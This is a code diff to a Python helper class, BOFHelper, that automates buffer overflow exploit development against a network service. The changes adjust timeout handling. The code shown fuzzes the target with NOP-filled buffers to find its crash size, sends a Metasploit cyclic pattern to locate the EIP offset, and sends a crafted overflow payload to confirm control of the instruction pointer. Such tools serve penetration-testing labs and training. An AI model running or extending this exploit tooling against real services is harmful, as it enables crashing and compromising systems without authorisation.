@@ -128,7 +128,7 @@ def split_list(lst: list, n: int) -> list[list]:
 
 class BOFHelper:
     def __init__(self, interface: str, local_port: int, ip: str, port: int, header: bytes = b"",
-                 prefix: bytes = b"", suffix: bytes = b"", inc: int = 200, timeout: float = 10.0,
+                 prefix: bytes = b"", suffix: bytes = b"", inc: int = 200, timeout: float = 5.0,
                  recv: bool = False, ask_crash: bool = False, strict: bool = False, verify: bool = False,
                  debug: bool = True):
         self._interface = interface
@@ -433,11 +433,9 @@ class BOFHelper:
         mid = low + (high - low) // 2  # Safe way to get mid
         self._debug_log("Sending buffer of size %s..." % mid)
         error = self.send_data(b"\x90" * mid)
-        if error == BOFErrorConnectionTimeout:
-            return BOFErrorConnectionTimeout
 
         # Did not crash -> set @low to mid
-        if not self._check_crash(error):
+        if not self._check_crash(error) and error != BOFErrorConnectionTimeout:
             return self._find_crash_threshold(high, mid)
 
         # Service crashed -> set @high to mid
@@ -519,12 +517,10 @@ class BOFHelper:
             return BOFErrorInvalid
 
         self._prompt_debugger()
-        error = self.send_data(execute("msf-pattern_create -l %s" % self._numBytes))
-        if error == BOFErrorConnectionTimeout:
-            return BOFErrorConnectionTimeout
+        error = self.send_data(execute("msf-pattern_create -l %s" % self._numBytes), 5)
 
         # Service didn't crash. Bye!
-        if not self._check_crash(error):
+        if not self._check_crash(error) and error != BOFErrorConnectionTimeout:
             self._err_log("Service did not crash!")
             return BOFErrorServiceAlive
 
@@ -832,11 +828,9 @@ class BOFHelper:
 
         self._prompt_debugger()
         error = self.send_data(b"\x90" * self._eipOffset + b"A" * 4 + b"\x90" * (self._espPadding + space), 5)
-        if error == BOFErrorConnectionTimeout:
-            return False
 
         # Service should always crash
-        if not self._check_crash(error):
+        if not self._check_crash(error) and error != BOFErrorConnectionTimeout:
             self._err_log("Service did not crash! (should never happen)")
             return False
 
